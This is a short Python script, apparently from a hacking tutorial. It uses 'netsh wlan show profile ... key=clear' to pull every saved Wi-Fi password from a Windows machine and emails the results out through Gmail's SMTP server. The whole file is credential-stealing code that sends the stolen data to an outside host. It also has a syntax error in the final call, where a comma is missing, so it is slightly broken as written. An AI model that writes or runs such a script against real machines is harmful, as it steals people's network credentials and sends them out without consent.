#!/usr/bin/env python

import subprocess
import smtplib
import re

email_addr = ""
password = ""

def send_email(email, password, content):
    sender = smtplib.SMTP("smtp.gmail.com", 587)
    sender.starttls()
    sender.login(email, password)
    sender.sendmail(email, email, content)
    sender.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networks_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in networks_names_list:
    get_password = "netsh wlan show profile " + network_name + " key=clear"
    current_network = subprocess.check_output(get_password, shell=True)
    result = result + current_network

send_email(email_addr password, result)